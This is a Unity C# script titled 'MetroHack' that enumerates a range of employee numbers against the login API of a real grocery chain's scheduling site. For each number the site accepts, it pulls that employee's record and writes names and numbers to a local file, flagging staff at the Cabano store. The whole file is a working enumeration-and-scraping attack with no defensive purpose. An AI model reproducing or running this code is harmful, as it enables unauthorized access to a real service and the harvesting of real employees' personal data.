using System.Net;
using System.IO;
using System.Collections;
using System.Collections.Generic;
using UnityEngine;
using UnityEngine.UI;

class Employee {
    public string Number;
    public string Name;
}

public class MetroHack : MonoBehaviour {

    const string urlEmployeeData = @"https://monhoraire.metro.ca/api/Employee/";
    const string urlLogin = @"https://monhoraire.metro.ca/api/Login/";

    public int fromNumber = 722000;
    public int toNumber = 723000;

    public RectTransform loadingBar;
    public RectTransform loadingBarTotal;

    bool hasStarted = false;

    void Start () {
        loadingBar.localScale = Vector3.up;
    }

    private void Update () {
        if(!hasStarted) {
            hasStarted = true;
            StartCoroutine(Analyse());
        }
    }

    IEnumerator Analyse () {
        using(FileStream fileStream = new FileStream((Application.dataPath + "/_Project/Scripts/MetroHacking/cabano.txt"), FileMode.OpenOrCreate)) {
            using(StreamWriter writer = new StreamWriter(fileStream)) {
                for(int i = fromNumber; i < toNumber; i++) {
                    loadingBar.localScale = new Vector2(((float)(i - fromNumber + 1) / (toNumber - fromNumber)), 1f);

                    yield return new WaitForEndOfFrame();
                    string loginData = string.Empty;
                    string employeeData = string.Empty;

                    HttpWebRequest loginRequest = (HttpWebRequest)WebRequest.Create(urlLogin + i);
                    loginRequest.AutomaticDecompression = DecompressionMethods.GZip;

                    try {
                        using(HttpWebResponse response = (HttpWebResponse)loginRequest.GetResponse())
                        using(Stream stream = response.GetResponseStream())
                        using(StreamReader reader = new StreamReader(stream)) {
                            loginData = reader.ReadToEnd();
                        }
                        if(loginData != "[\"Login\",\"Invalid employee number\"]") {
                            Debug.Log("Existing number: " + i);

                            HttpWebRequest employeeDataRequest = (HttpWebRequest)WebRequest.Create(urlEmployeeData);
                            employeeDataRequest.AutomaticDecompression = DecompressionMethods.GZip;

                            using(HttpWebResponse responseD = (HttpWebResponse)employeeDataRequest.GetResponse())
                            using(Stream stream = responseD.GetResponseStream())
                            using(StreamReader reader = new StreamReader(stream)) {
                                employeeData = reader.ReadToEnd();

                                Employee employee = JsonUtility.FromJson<Employee>(employeeData);
                                if(employeeData.Contains("\"StoreName\":\"Cabano\"")) {
                                    writer.Write($"[{employee.Name} : {employee.Number}] /!\\Cabano/!\\ \n");
                                } else {
                                    writer.Write($"[{employee.Name} : {employee.Number}]\n");
                                }
                            }
                        }
                    } catch(System.Exception e) {

                    }
                }
            }
        }
    }
}
